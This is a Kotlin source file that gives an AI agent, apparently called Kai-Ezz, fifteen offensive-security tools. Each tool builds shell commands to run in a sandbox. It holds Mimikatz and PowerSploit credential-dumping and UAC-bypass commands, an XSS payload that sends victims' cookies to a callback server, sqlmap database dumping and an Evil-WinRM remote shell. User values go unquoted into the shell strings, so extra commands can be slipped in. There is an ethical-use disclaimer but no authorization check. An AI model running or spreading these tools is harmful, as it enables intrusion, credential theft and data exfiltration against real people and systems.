package com.inspiredandroid.kai.tools

import com.inspiredandroid.kai.network.tools.ParameterSchema
import com.inspiredandroid.kai.network.tools.Tool
import com.inspiredandroid.kai.network.tools.ToolInfo
import com.inspiredandroid.kai.network.tools.ToolSchema

/**
 * AdvancedHackingTools — مجموعة أدوات اختراق متقدمة تغطي مجالات OSINT، الاستغلال، وما بعد الاستغلال.
 * هذه الأدوات مصممة لتوسيع قدرات Kai-Ezz في مهام الأمن السيبراني المعقدة.
 *
 * تشمل الأدوات:
 * OSINT: Shodan, theHarvester, Recon-ng, Sublist3r, Amass
 * Exploitation: Searchsploit, Wfuzz, SQLi Dumper, XSS Hunter (conceptual), DirBuster (conceptual)
 * Post-Exploitation: LinEnum, PowerSploit (conceptual), Mimikatz (conceptual), BloodHound (conceptual), Evil-WinRM
 *
 * ملاحظة: هذه الأدوات مخصصة للاستخدام القانوني والأخلاقي فقط (Ethical Hacking / Penetration Testing).
 */
object AdvancedHackingTools {

    // ─────────────────────────────────────────────────────────────────
    // OSINT Tools
    // ─────────────────────────────────────────────────────────────────

    // 1. Shodan — محرك بحث لأجهزة متصلة بالإنترنت
    val shodanSearchTool = object : Tool {
        override val schema = ToolSchema(
            name = "shodan_search",
            description = "Shodan: search for internet-connected devices, open ports, and services. Requires Shodan API key. Use for OSINT and vulnerability research.",
            parameters = mapOf(
                "query" to ParameterSchema("string", "Search query (e.g., apache, port:80, country:US)", true),
                "api_key" to ParameterSchema("string", "Your Shodan API key", true),
                "limit" to ParameterSchema("integer", "Number of results to return (default: 10)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val query = args["query"]?.toString() ?: return mapOf("success" to false, "error" to "query is required")
            val apiKey = args["api_key"]?.toString() ?: return mapOf("success" to false, "error" to "api_key is required")
            val limit = args["limit"]?.toString() ?: "10"
            val command = "shodan search --limit $limit \"$query\" --api-key \"$apiKey\""
            return mapOf("success" to true, "tool" to "shodan", "command" to command, "note" to "Run this command via execute_shell_command in the Linux sandbox.")
        }
    }

    // 2. theHarvester — جمع معلومات OSINT
    val theHarvesterTool = object : Tool {
        override val schema = ToolSchema(
            name = "theharvester_recon",
            description = "theHarvester: gather OSINT information (emails, subdomains, hosts, employee names, open ports) from public sources like search engines and PGP key servers.",
            parameters = mapOf(
                "domain" to ParameterSchema("string", "Target domain (e.g., example.com)", true),
                "source" to ParameterSchema("string", "Data source: baidu | bing | google | linkedin | twitter | all (default: all)", false),
                "limit" to ParameterSchema("integer", "Limit the number of results (default: 500)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val domain = args["domain"]?.toString() ?: return mapOf("success" to false, "error" to "domain is required")
            val source = args["source"]?.toString() ?: "all"
            val limit = args["limit"]?.toString() ?: "500"
            val command = "theharvester -d \"$domain\" -b \"$source\" -l $limit"
            return mapOf("success" to true, "tool" to "theharvester", "command" to command, "note" to "Run this command via execute_shell_command in the Linux sandbox.")
        }
    }

    // 3. Recon-ng — إطار عمل استطلاع الويب
    val reconNgTool = object : Tool {
        override val schema = ToolSchema(
            name = "recon_ng_recon",
            description = "Recon-ng: full-featured web reconnaissance framework. Automates OSINT tasks. This tool generates commands to run specific modules.",
            parameters = mapOf(
                "module" to ParameterSchema("string", "Recon-ng module to run (e.g., recon/domains-hosts/google_site_web)", true),
                "options" to ParameterSchema("string", "Module options as key=value pairs (e.g., SOURCE=example.com)", true)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val module = args["module"]?.toString() ?: return mapOf("success" to false, "error" to "module is required")
            val options = args["options"]?.toString() ?: return mapOf("success" to false, "error" to "options are required")
            val command = "recon-ng -x \"use $module; set $options; run;\""
            return mapOf("success" to true, "tool" to "recon-ng", "command" to command, "note" to "Run this command via execute_shell_command in the Linux sandbox.")
        }
    }

    // 4. Sublist3r — تعداد النطاقات الفرعية
    val sublist3rTool = object : Tool {
        override val schema = ToolSchema(
            name = "sublist3r_enum",
            description = "Sublist3r: enumerate subdomains of websites using OSINT. Finds subdomains using Google, Yahoo, Bing, Baidu, Ask, Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS.",
            parameters = mapOf(
                "domain" to ParameterSchema("string", "Target domain (e.g., example.com)", true),
                "ports" to ParameterSchema("string", "Ports to scan for found subdomains (e.g., 80,443)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val domain = args["domain"]?.toString() ?: return mapOf("success" to false, "error" to "domain is required")
            val ports = args["ports"]?.toString()
            val portFlag = if (ports != null) "-p $ports" else ""
            val command = "sublist3r -d \"$domain\" $portFlag"
            return mapOf("success" to true, "tool" to "sublist3r", "command" to command, "note" to "Run this command via execute_shell_command in the Linux sandbox.")
        }
    }

    // 5. Amass — إطار عمل تعداد النطاقات الفرعية
    val amassTool = object : Tool {
        override val schema = ToolSchema(
            name = "amass_enum",
            description = "Amass: extensive attack surface mapping and external asset discovery. Focuses on subdomain enumeration using various techniques.",
            parameters = mapOf(
                "domain" to ParameterSchema("string", "Target domain (e.g., example.com)", true),
                "passive" to ParameterSchema("boolean", "Perform passive enumeration only (default: true)", false),
                "active" to ParameterSchema("boolean", "Perform active enumeration (requires more permissions, default: false)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val domain = args["domain"]?.toString() ?: return mapOf("success" to false, "error" to "domain is required")
            val passive = args["passive"] as? Boolean ?: true
            val active = args["active"] as? Boolean ?: false

            val modeFlag = when {
                active -> "enum -active"
                passive -> "enum -passive"
                else -> "enum -passive"
            }
            val command = "amass $modeFlag -d \"$domain\""
            return mapOf("success" to true, "tool" to "amass", "command" to command, "note" to "Run this command via execute_shell_command in the Linux sandbox.")
        }
    }

    // ─────────────────────────────────────────────────────────────────
    // Exploitation Tools
    // ─────────────────────────────────────────────────────────────────

    // 6. Searchsploit — البحث عن الثغرات في Exploit-DB
    val searchsploitTool = object : Tool {
        override val schema = ToolSchema(
            name = "searchsploit_exploit",
            description = "Searchsploit: command-line search tool for Exploit-DB. Find exploits and shellcode for various software and systems.",
            parameters = mapOf(
                "query" to ParameterSchema("string", "Search term (e.g., apache, wordpress 5.0)", true),
                "platform" to ParameterSchema("string", "Filter by platform (e.g., windows, linux, webapps)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val query = args["query"]?.toString() ?: return mapOf("success" to false, "error" to "query is required")
            val platform = args["platform"]?.toString()
            val platformFlag = if (platform != null) "--platform \"$platform\"" else ""
            val command = "searchsploit $platformFlag \"$query\""
            return mapOf("success" to true, "tool" to "searchsploit", "command" to command, "note" to "Run this command via execute_shell_command in the Linux sandbox.")
        }
    }

    // 7. Wfuzz — فحص تطبيقات الويب
    val wfuzzTool = object : Tool {
        override val schema = ToolSchema(
            name = "wfuzz_fuzz",
            description = "Wfuzz: web application fuzzer. Used for brute-forcing web forms, parameters, directories, and more. Highly customizable.",
            parameters = mapOf(
                "url" to ParameterSchema("string", "Target URL with FUZZ keyword (e.g., http://example.com/FUZZ)", true),
                "wordlist" to ParameterSchema("string", "Path to wordlist file", true),
                "method" to ParameterSchema("string", "HTTP method: GET | POST (default: GET)", false),
                "data" to ParameterSchema("string", "POST data with FUZZ keyword (for POST method)", false),
                "hide_codes" to ParameterSchema("string", "HTTP status codes to hide (e.g., 404,403)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val url = args["url"]?.toString() ?: return mapOf("success" to false, "error" to "url is required")
            val wordlist = args["wordlist"]?.toString() ?: return mapOf("success" to false, "error" to "wordlist is required")
            val method = args["method"]?.toString() ?: "GET"
            val data = args["data"]?.toString()
            val hideCodes = args["hide_codes"]?.toString() ?: "404"

            val dataFlag = if (method == "POST" && data != null) "-d \"$data\"" else ""
            val command = "wfuzz -c -z file,\"$wordlist\" --hc $hideCodes -X $method $dataFlag \"$url\""
            return mapOf("success" to true, "tool" to "wfuzz", "command" to command, "note" to "Run this command via execute_shell_command in the Linux sandbox.")
        }
    }

    // 8. SQLi Dumper — استخراج البيانات من قواعد البيانات
    val sqliDumperTool = object : Tool {
        override val schema = ToolSchema(
            name = "sqli_dumper",
            description = "SQLi Dumper: automate the process of dumping data from SQL injection vulnerable databases. This is a conceptual tool to represent advanced SQLi exploitation.",
            parameters = mapOf(
                "url" to ParameterSchema("string", "Target URL with SQLi vulnerability", true),
                "database" to ParameterSchema("string", "Database name to dump", false),
                "table" to ParameterSchema("string", "Table name to dump", false),
                "columns" to ParameterSchema("string", "Columns to dump (comma-separated)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val url = args["url"]?.toString() ?: return mapOf("success" to false, "error" to "url is required")
            val database = args["database"]?.toString()
            val table = args["table"]?.toString()
            val columns = args["columns"]?.toString()

            val dbFlag = if (database != null) "-D \"$database\"" else ""
            val tableFlag = if (table != null) "-T \"$table\"" else ""
            val columnFlag = if (columns != null) "-C \"$columns\"" else ""

            val command = "sqlmap -u \"$url\" --batch --dump $dbFlag $tableFlag $columnFlag"
            return mapOf("success" to true, "tool" to "sqli_dumper", "command" to command, "note" to "This command uses sqlmap for dumping. Run via execute_shell_command.")
        }
    }

    // 9. XSS Hunter (Conceptual) — اكتشاف ثغرات XSS
    val xssHunterTool = object : Tool {
        override val schema = ToolSchema(
            name = "xss_hunter_detect",
            description = "XSS Hunter (conceptual): detects Cross-Site Scripting (XSS) vulnerabilities by injecting payloads that callback to a monitoring server. This tool simulates generating an XSS payload.",
            parameters = mapOf(
                "callback_url" to ParameterSchema("string", "Your XSS Hunter callback URL (e.g., https://yoursubdomain.xss.ht)", true),
                "payload_type" to ParameterSchema("string", "Type of XSS payload: basic | html_tag | script_tag (default: basic)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val callbackUrl = args["callback_url"]?.toString() ?: return mapOf("success" to false, "error" to "callback_url is required")
            val payloadType = args["payload_type"]?.toString() ?: "basic"

            val payload = when (payloadType) {
                "html_tag" -> "<img src=\"x\" onerror=\"var i=new Image;i.src=\\'$callbackUrl/?c=\\'+document.cookie;\" />"
                "script_tag" -> "<script>var i=new Image;i.src=\\'$callbackUrl/?c=\\'+document.cookie;</script>"
                else -> "\"`alert(1)//`\""
            }
            return mapOf("success" to true, "tool" to "xss_hunter", "payload" to payload, "note" to "Inject this payload into a vulnerable web parameter and monitor your XSS Hunter dashboard.")
        }
    }

    // 10. DirBuster (Conceptual) — تعداد الدلائل والملفات
    val dirBusterTool = object : Tool {
        override val schema = ToolSchema(
            name = "dirbuster_enum",
            description = "DirBuster (conceptual): brute-force directories and file names on web servers. This tool simulates generating a command for directory brute-forcing using a common wordlist.",
            parameters = mapOf(
                "url" to ParameterSchema("string", "Target URL (e.g., http://example.com)", true),
                "wordlist" to ParameterSchema("string", "Path to wordlist file (default: /usr/share/wordlists/dirb/common.txt)", false),
                "extensions" to ParameterSchema("string", "File extensions to search (e.g., php,html,txt)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val url = args["url"]?.toString() ?: return mapOf("success" to false, "error" to "url is required")
            val wordlist = args["wordlist"]?.toString() ?: "/usr/share/wordlists/dirb/common.txt"
            val extensions = args["extensions"]?.toString()

            val extFlag = if (extensions != null) "-x $extensions" else ""
            val command = "gobuster dir -u \"$url\" -w \"$wordlist\" $extFlag"
            return mapOf("success" to true, "tool" to "dirbuster", "command" to command, "note" to "This command uses gobuster for directory brute-forcing. Run via execute_shell_command.")
        }
    }

    // ─────────────────────────────────────────────────────────────────
    // Post-Exploitation Tools
    // ─────────────────────────────────────────────────────────────────

    // 11. LinEnum — تعداد نظام Linux
    val linEnumTool = object : Tool {
        override val schema = ToolSchema(
            name = "linenum_enum",
            description = "LinEnum: script for local Linux enumeration and privilege escalation checks. Gathers system information, user data, network configs, kernel info, installed software, and potential vulnerabilities.",
            parameters = mapOf(
                "output_file" to ParameterSchema("string", "Save results to this file path (optional, e.g. /tmp/linenum_report.txt)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val outputFile = args["output_file"]?.toString()
            val outputRedirect = if (outputFile != null) "> \"$outputFile\"" else ""
            val command = "/opt/LinEnum.sh $outputRedirect"
            return mapOf("success" to true, "tool" to "linenum", "command" to command, "note" to "Ensure LinEnum.sh is available at /opt/LinEnum.sh. Run via execute_shell_command.")
        }
    }

    // 12. PowerSploit (Conceptual) — إطار عمل ما بعد الاستغلال لـ PowerShell
    val powersploitTool = object : Tool {
        override val schema = ToolSchema(
            name = "powersploit_post_exploit",
            description = "PowerSploit (conceptual): a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. This tool simulates generating a PowerShell command for a common post-exploitation task.",
            parameters = mapOf(
                "task" to ParameterSchema("string", "Post-exploitation task: enumerate_users | get_creds | bypass_uac (default: enumerate_users)", false),
                "target_host" to ParameterSchema("string", "Target Windows host (optional)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val task = args["task"]?.toString() ?: "enumerate_users"
            val targetHost = args["target_host"]?.toString()

            val command = when (task) {
                "enumerate_users" -> "powershell -Command \"Get-NetUser -Domain $targetHost\""
                "get_creds" -> "powershell -Command \"Invoke-Mimikatz -DumpCreds\""
                "bypass_uac" -> "powershell -Command \"Invoke-BypassUAC\""
                else -> "powershell -Command \"Get-Help PowerSploit\""
            }
            return mapOf("success" to true, "tool" to "powersploit", "command" to command, "note" to "This command simulates a PowerShell PowerSploit module. Run via execute_shell_command on a Windows target.")
        }
    }

    // 13. Mimikatz (Conceptual) — استخراج بيانات الاعتماد من الذاكرة
    val mimikatzTool = object : Tool {
        override val schema = ToolSchema(
            name = "mimikatz_creds_dump",
            description = "Mimikatz (conceptual): extracts plaintext passwords, hash, PIN code, and kerberos tickets from memory. This tool simulates generating a command to dump credentials.",
            parameters = mapOf(
                "action" to ParameterSchema("string", "Action: dump_passwords | dump_hashes | dump_kerberos (default: dump_passwords)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val action = args["action"]?.toString() ?: "dump_passwords"
            val command = when (action) {
                "dump_passwords" -> "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
                "dump_hashes" -> "mimikatz.exe \"privilege::debug\" \"lsadump::sam\" exit"
                "dump_kerberos" -> "mimikatz.exe \"privilege::debug\" \"kerberos::list\" exit"
                else -> "mimikatz.exe help"
            }
            return mapOf("success" to true, "tool" to "mimikatz", "command" to command, "note" to "This command simulates Mimikatz execution. Requires administrative privileges on a Windows system. Run via execute_shell_command.")
        }
    }

    // 14. BloodHound (Conceptual) — رسم خرائط Active Directory
    val bloodhoundTool = object : Tool {
        override val schema = ToolSchema(
            name = "bloodhound_recon",
            description = "BloodHound (conceptual): maps relationships in an Active Directory environment to identify attack paths. This tool simulates generating a command to collect data for BloodHound.",
            parameters = mapOf(
                "collection_method" to ParameterSchema("string", "Data collection method: all | group | session | acl (default: all)", false),
                "domain" to ParameterSchema("string", "Target Active Directory domain (optional)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val collectionMethod = args["collection_method"]?.toString() ?: "all"
            val domain = args["domain"]?.toString()

            val domainFlag = if (domain != null) "-d \"$domain\"" else ""
            val command = "sharphound.exe -c \"$collectionMethod\" $domainFlag"
            return mapOf("success" to true, "tool" to "bloodhound", "command" to command, "note" to "This command simulates SharpHound data collection for BloodHound. Run via execute_shell_command on a Windows domain-joined machine.")
        }
    }

    // 15. Evil-WinRM — إدارة Windows عن بعد
    val evilWinRMTool = object : Tool {
        override val schema = ToolSchema(
            name = "evil_winrm_shell",
            description = "Evil-WinRM: ultimate WinRM shell for hacking/pentesting. Provides full access to Windows machines via WinRM. Requires valid credentials.",
            parameters = mapOf(
                "target_host" to ParameterSchema("string", "Target Windows host IP or hostname", true),
                "username" to ParameterSchema("string", "Username for authentication", true),
                "password" to ParameterSchema("string", "Password for authentication", true),
                "command" to ParameterSchema("string", "Command to execute on the remote host (optional)", false)
            )
        )

        override suspend fun execute(args: Map<String, Any>): Any {
            val targetHost = args["target_host"]?.toString() ?: return mapOf("success" to false, "error" to "target_host is required")
            val username = args["username"]?.toString() ?: return mapOf("success" to false, "error" to "username is required")
            val password = args["password"]?.toString() ?: return mapOf("success" to false, "error" to "password is required")
            val commandToExecute = args["command"]?.toString()

            val cmdFlag = if (commandToExecute != null) "-c \"$commandToExecute\"" else ""
            val command = "evil-winrm -i \"$targetHost\" -u \"$username\" -p \"$password\" $cmdFlag"
            return mapOf("success" to true, "tool" to "evil_winrm", "command" to command, "note" to "Run this command via execute_shell_command in the Linux sandbox.")
        }
    }

    // ─────────────────────────────────────────────────────────────────
    // ToolInfo definitions
    // ─────────────────────────────────────────────────────────────────
    val shodanSearchToolInfo = ToolInfo(
        id = "shodan_search",
        name = "Shodan Search",
        description = "Search for internet-connected devices and services",
        nameRes = null,
        descriptionRes = null,
    )
    val theHarvesterToolInfo = ToolInfo(
        id = "theharvester_recon",
        name = "theHarvester OSINT",
        description = "Gather OSINT information from public sources",
        nameRes = null,
        descriptionRes = null,
    )
    val reconNgToolInfo = ToolInfo(
        id = "recon_ng_recon",
        name = "Recon-ng Framework",
        description = "Full-featured web reconnaissance framework",
        nameRes = null,
        descriptionRes = null,
    )
    val sublist3rToolInfo = ToolInfo(
        id = "sublist3r_enum",
        name = "Sublist3r Subdomain Enumerator",
        description = "Enumerate subdomains of websites using OSINT",
        nameRes = null,
        descriptionRes = null,
    )
    val amassToolInfo = ToolInfo(
        id = "amass_enum",
        name = "Amass Attack Surface Mapper",
        description = "Extensive attack surface mapping and external asset discovery",
        nameRes = null,
        descriptionRes = null,
    )
    val searchsploitToolInfo = ToolInfo(
        id = "searchsploit_exploit",
        name = "Searchsploit Exploit-DB",
        description = "Search for exploits and shellcode in Exploit-DB",
        nameRes = null,
        descriptionRes = null,
    )
    val wfuzzToolInfo = ToolInfo(
        id = "wfuzz_fuzz",
        name = "Wfuzz Web Fuzzer",
        description = "Brute-force web forms, parameters, and directories",
        nameRes = null,
        descriptionRes = null,
    )
    val sqliDumperToolInfo = ToolInfo(
        id = "sqli_dumper",
        name = "SQLi Dumper (Conceptual)",
        description = "Automate data dumping from SQL injection vulnerable databases",
        nameRes = null,
        descriptionRes = null,
    )
    val xssHunterToolInfo = ToolInfo(
        id = "xss_hunter_detect",
        name = "XSS Hunter (Conceptual)",
        description = "Detect Cross-Site Scripting (XSS) vulnerabilities",
        nameRes = null,
        descriptionRes = null,
    )
    val dirBusterToolInfo = ToolInfo(
        id = "dirbuster_enum",
        name = "DirBuster (Conceptual)",
        description = "Brute-force directories and file names on web servers",
        nameRes = null,
        descriptionRes = null,
    )
    val linEnumToolInfo = ToolInfo(
        id = "linenum_enum",
        name = "LinEnum Linux Enumerator",
        description = "Script for local Linux enumeration and privilege escalation checks",
        nameRes = null,
        descriptionRes = null,
    )
    val powersploitToolInfo = ToolInfo(
        id = "powersploit_post_exploit",
        name = "PowerSploit (Conceptual)",
        description = "PowerShell modules for post-exploitation tasks",
        nameRes = null,
        descriptionRes = null,
    )
    val mimikatzToolInfo = ToolInfo(
        id = "mimikatz_creds_dump",
        name = "Mimikatz (Conceptual)",
        description = "Extracts plaintext passwords, hashes, and Kerberos tickets from memory",
        nameRes = null,
        descriptionRes = null,
    )
    val bloodhoundToolInfo = ToolInfo(
        id = "bloodhound_recon",
        name = "BloodHound (Conceptual)",
        description = "Maps relationships in Active Directory to identify attack paths",
        nameRes = null,
        descriptionRes = null,
    )
    val evilWinRMToolInfo = ToolInfo(
        id = "evil_winrm_shell",
        name = "Evil-WinRM Shell",
        description = "Ultimate WinRM shell for hacking/pentesting Windows machines",
        nameRes = null,
        descriptionRes = null,
    )

    val advancedHackingToolDefinitions = listOf(
        shodanSearchToolInfo,
        theHarvesterToolInfo,
        reconNgToolInfo,
        sublist3rToolInfo,
        amassToolInfo,
        searchsploitToolInfo,
        wfuzzToolInfo,
        sqliDumperToolInfo,
        xssHunterToolInfo,
        dirBusterToolInfo,
        linEnumToolInfo,
        powersploitToolInfo,
        mimikatzToolInfo,
        bloodhoundToolInfo,
        evilWinRMToolInfo,
    )

    val advancedHackingTools = listOf(
        shodanSearchTool,
        theHarvesterTool,
        reconNgTool,
        sublist3rTool,
        amassTool,
        searchsploitTool,
        wfuzzTool,
        sqliDumperTool,
        xssHunterTool,
        dirBusterTool,
        linEnumTool,
        powersploitTool,
        mimikatzTool,
        bloodhoundTool,
        evilWinRMTool,
    )
}
